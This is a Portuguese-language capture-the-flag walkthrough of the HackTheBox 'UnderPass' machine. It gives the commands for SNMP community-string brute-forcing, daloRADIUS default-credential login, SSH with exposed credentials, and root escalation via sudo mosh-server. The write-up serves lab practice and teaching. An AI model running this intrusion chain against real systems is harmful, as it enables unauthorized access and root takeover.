---
title: "HackTheBox - UnderPass"
author: mithr4nd1r
date: 2025-04-01 11:00:00 -0300
categories: [Walkthrough, HackTheBox]
tags: [writeup, walkthrough, hackthebox, htb, pentest, ctf, linux, easy, snmp, daloradius, mosh, sudo]
pin: false
---

> **Dificuldade**: Fácil
{: .prompt-info }

> Writeup importado do Notion. Imagens originais omitidas — algumas referências de tela mantidas em texto.
{: .prompt-tip }

## 1. Escaneamento

```bash
Nmap scan report for 10.10.11.48
Host is up (4.2s latency).
Not shown: 53156 closed ports, 12377 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 2. Enumeração

### SNMP (UDP 161)

Scan adicional UDP revela serviço SNMP:

```
Nmap scan report for underpass.htb (10.10.11.48)
Host is up (0.24s latency).

PORT      STATE         SERVICE      VERSION
161/udp   open          snmp         SNMPv1 server; net-snmp SNMPv3 server (p
Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!
```

Brute-force de community strings:

```bash
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp-onesixtyone.txt -i ip.txt
```

```
Scanning 1 hosts, 3218 communities
10.10.11.48 [public] Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
```

Enumeração SNMP completa:

```bash
snmpwalk -c public -v1 -t 10 10.10.11.48
```

### Web (80) — daloradius

Página default. Busca por subdomínios e diretórios:

```bash
feroxbuster -u http://underpass.htb/daloradius -w /opt/seclists/Discovery/Web-Content/raft-medium-directories.txt -x .git,php,txt -C 404
```

Encontrada URL: `http://underpass.htb/daloradius/doc/install/INSTALL`

Login com credenciais padrão do daloradius:

- Usuário: `Administrator`
- Senha: `radius`

## 3. Acesso Inicial

Após login no daloradius, encontradas credenciais SSH:

- Usuário: `svcMosh`
- Senha: `underwaterfriends`

```bash
ssh svcMosh@underpass.htb
```

## 4. Pós-Exploração

```bash
sudo -l
```

`svcMosh` pode executar `/usr/bin/mosh-server` como root sem senha.

## 5. Escalação de Privilégio

Mosh (Mobile Shell) é um substituto do SSH. Executar o server como root e conectar com `mosh-client`:

```bash
sudo /usr/bin/mosh-server new
# Output retorna MOSH_KEY e porta

export MOSH_KEY=ctx+Rh6oRfSgfZIdEFhkRw
mosh-client 127.0.0.1 60001
```

A sessão `mosh-client` herda o contexto root do `mosh-server`. Shell root obtido.

## Resumo da Cadeia

| Etapa | Técnica |
|-------|---------|
| Recon | nmap TCP + UDP, SNMP community brute-force |
| Foothold | Default creds daloradius (`Administrator:radius`) |
| Initial Access | SSH como `svcMosh` (creds expostas no painel) |
| PrivEsc | sudo `mosh-server` → mosh-client conecta como root |
